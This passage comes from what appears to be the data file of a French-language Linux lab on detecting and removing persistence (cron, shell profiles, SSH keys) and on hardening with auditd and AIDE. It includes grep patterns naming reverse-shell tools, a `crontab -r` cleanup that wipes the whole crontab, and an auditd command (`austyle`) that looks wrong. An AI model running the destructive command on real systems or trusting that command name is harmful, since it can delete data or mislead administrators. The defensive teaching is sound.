        "Pour détecter la persistance :\n- **cron** : `crontab -l` (utilisateur), `ls /etc/cron.*/ /var/spool/cron/` (système). Toute entrée inconnue = IOC.\n- **profils** : `grep -r 'curl\\|wget\\|bash -i\\|nc ' ~/.bashrc ~/.zshrc /etc/profile.d/` — un reverse-shell one-liner est rarement légitime.\n- **SSH** : `cat ~/.ssh/authorized_keys` — comparer aux clés connues de l'équipe.\n\nNettoyage : supprimer l'entrée cron (`crontab -e` ou `crontab -r`), retirer la ligne injectée dans les profils, purger authorized_keys.",
      target: "docker-bash",
      code: 'cd /tmp/lab-persist\necho "=== Audit crontab ==="\ncrontab -l 2>/dev/null | grep -v "^#" | grep . || echo "(vide)"\necho "=== Audit profil shell (lignes suspectes) ==="\ngrep -nE "curl|wget|bash -i|nc |/dev/tcp" .bashrc 2>/dev/null || echo "rien de suspect"\necho "=== Audit SSH authorized_keys ==="\ncat .ssh/authorized_keys 2>/dev/null || echo "(pas de fichier)"\n# Nettoyage demo\ncrontab -r 2>/dev/null && echo "crontab supprime" || echo "(pas de crontab)"\necho "(en prod : editer authorized_keys manuellement pour retirer la fausse cle)"',
      expected:
        "L'audit liste l'entrée cron beacon et la ligne suspecte dans `.bashrc`. Après `crontab -r`, `crontab -l` retourne vide. En prod, on complète avec auditd (`-w ~/.ssh/authorized_keys -p wa`) pour alerter en temps réel.",
    },
    {
      n: 6,
      title: "Durcir : auditd + intégrité fichiers",
      goal: "Mettre en place la détection automatique des modifications de persistance.",
      explain:
        "Les outils de défense niveau système :\n\n1. **auditd** : surveille en temps réel les appels système — règles `-w /var/spool/cron -p wa` + `-w ~/.ssh/authorized_keys -p wa` → log dans `/var/log/audit/audit.log` à chaque écriture.\n2. **AIDE / Tripwire** : hashage de l'état initial de fichiers critiques ; `aide --check` compare → rapport des drifts.\n3. **Principe du moindre privilège** : utilisateurs non-root ne devraient pas avoir accès à `crontab` en prod (PAM, `/etc/cron.deny`).\n4. **Surveillance SSH** : désactiver `PasswordAuthentication` + `PermitRootLogin` ; restreindre `AllowUsers`.\n\nRéférence rapide auditd :\n```bash\nauditctl -w /var/spool/cron -p wa -k cron-watch\nauditctl -w ~/.ssh/authorized_keys -p wa -k ssh-keys-watch\naustyle \"key=cron-watch\" /var/log/audit/audit.log\n```",
      target: "read",
    },
  ],
};